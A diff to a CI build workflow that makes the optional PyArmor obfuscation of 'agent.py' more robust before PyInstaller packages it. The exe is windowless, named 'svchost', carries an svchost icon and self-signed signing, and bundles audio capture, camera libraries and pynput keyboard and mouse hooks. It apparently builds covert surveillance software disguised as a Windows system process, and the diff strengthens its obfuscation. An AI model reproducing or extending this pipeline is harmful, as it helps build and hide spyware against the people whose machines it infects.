@@ -1728,6 +1728,16 @@ jobs:
           '@
           $inject | python -
 
+      - name: Register PyArmor license
+        if: ${{ secrets.PYARMOR_REGCODE != '' }}
+        shell: pwsh
+        env:
+          PYARMOR_REGCODE: ${{ secrets.PYARMOR_REGCODE }}
+        run: |
+          Set-Content -Path regcode.txt -Value $env:PYARMOR_REGCODE
+          pyarmor reg -p "non-profits" regcode.txt
+          pyarmor -v
+
       - name: Build exe
         shell: pwsh
         env:
@@ -1735,14 +1745,24 @@ jobs:
         run: |
           $extra = @()
           $src = "agent.py"
+          $useObf = $false
           if ($env:OBF -eq "yes") {
-            pyarmor gen -O obf agent.py
-            $rt = (Get-ChildItem -Path obf -Directory | Where-Object { $_.Name -like 'pyarmor_runtime*' } | Select-Object -First 1).Name
-            $src = "obf/agent.py"
-            $extra += "--add-data"; $extra += "obf/$rt;$rt"
-            $extra += "--hidden-import"; $extra += "$rt"
+            Remove-Item obf -Recurse -Force -ErrorAction SilentlyContinue
+            try { pyarmor gen -O obf agent.py } catch {}
+            if (Test-Path "obf/agent.py") {
+              $rt = (Get-ChildItem -Path obf -Directory | Where-Object { $_.Name -like 'pyarmor_runtime*' } | Select-Object -First 1).Name
+              if ($rt) {
+                $src = "obf/agent.py"
+                $extra += "--add-data"; $extra += "obf/$rt;$rt"
+                $extra += "--hidden-import"; $extra += "$rt"
+                $useObf = $true
+              }
+            }
+            if ($useObf) { Write-Host "OK: build ban da obfuscate (PyArmor)" }
+            else { Write-Host "::warning::PyArmor free khong obfuscate duoc script lon - build ban thuong" }
           }
           pyinstaller --noconfirm --onefile --noconsole --name svchost --icon svchost.ico --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 @extra $src
+          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
 
       - name: Ký số self-signed
         if: ${{ github.event.inputs.sign == 'yes' }}
